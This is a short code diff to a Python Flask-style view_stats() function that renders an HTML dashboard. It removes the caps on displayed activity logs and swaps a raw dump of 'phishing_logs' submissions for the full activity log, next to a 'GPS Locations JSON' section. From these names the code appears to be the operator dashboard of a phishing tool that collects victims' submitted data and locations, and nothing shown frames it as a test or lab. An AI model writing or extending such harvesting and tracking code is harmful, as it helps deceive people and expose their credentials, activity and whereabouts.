@@ -591,9 +591,9 @@ def view_stats():
                 </div>
                 <div id="activity-content" class="collapsed">
     '''
-    
+
     if activity_logs:
-        for log in reversed(activity_logs[-50:]):  # Show last 50 activities
+        for log in reversed(activity_logs):  # Show ALL activities
             html += f'''
                     <div class="entry-card">
                         <h4>Action: {log.get('action', 'N/A')}</h4>
@@ -605,11 +605,12 @@ def view_stats():
             '''
     else:
         html += '<div class="no-data">No activities logged yet</div>'
-    
+
     html += '''
                 </div>
             </div>
     '''
+
     
     # Raw JSON Sections
     html += '''
@@ -618,10 +619,11 @@ def view_stats():
                     <h2>📄 Raw JSON Data</h2>
                 </div>
                 
-                <h3 style="margin: 20px 0 10px 0; color: #667eea;">Complete Submissions JSON</h3>
+                <h3 style="margin: 20px 0 10px 0; color: #667eea;">Activity Events JSON (All Events)</h3>
                 <div class="json-container">
-                    <pre class="json-content">''' + json.dumps(phishing_logs, indent=2) + '''</pre>
+                    <pre class="json-content">''' + json.dumps(activity_logs, indent=2) + '''</pre>
                 </div>
+
                 
                 <h3 style="margin: 20px 0 10px 0; color: #667eea;">GPS Locations JSON</h3>
                 <div class="json-container">
@@ -635,7 +637,7 @@ def view_stats():
                 
                 <h3 style="margin: 20px 0 10px 0; color: #667eea;">Activity Events JSON (Last 100)</h3>
                 <div class="json-container">
-                    <pre class="json-content">''' + json.dumps(activity_logs[-100:], indent=2) + '''</pre>
+                    <pre class="json-content">''' + json.dumps(activity_logs, indent=2) + '''</pre>
                 </div>
             </div>
         </div>
